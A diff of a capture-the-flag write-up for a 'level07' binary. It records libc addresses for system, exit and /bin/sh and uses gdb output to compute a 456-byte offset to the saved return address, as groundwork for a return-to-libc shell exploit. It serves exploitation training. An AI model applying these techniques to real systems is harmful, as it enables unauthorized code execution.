@@ -28,8 +28,35 @@ scp -P 4242 level07@192.168.56.109:level07 binary/
    - `system` : 0xf7e6aed0 = 4159090384\
    - `exit` : 0xf7e5eb70 = 4159040368\
    - `/bin/sh` : 0xf7f897ec = 4160264172
+---
+### Comupute offset
 
-- eip offset found = 456
+```
+(gdb) b *0x0804892b
+Breakpoint 1 at 0x804892b
+(gdb) run
+...
+Input command: read
+
+Breakpoint 1, 0x0804892b in main ()
+(gdb) info frame
+Stack level 0, frame at 0xffffd710:
+ eip = 0x804892b in main; saved eip 0xf7e45513
+ Arglist at 0xffffd708, args: 
+ Locals at 0xffffd708, Previous frame's sp is 0xffffd710
+ Saved registers:
+  ebx at 0xffffd6fc, ebp at 0xffffd708, esi at 0xffffd700, edi at 0xffffd704, eip at 0xffffd70c
+(gdb) x/x $eax
+0xffffd544:     0x00000000
+```
+- `eip` address : 0xffffd70c
+- `buffer` address : 0xffffd544
+
+`0xffffd70c - 0xffffd544 = 1c8` (456 in decimal)
+
+eip offset found : 456
+
+---
 
 ```
 buffer[index * 4] = number;
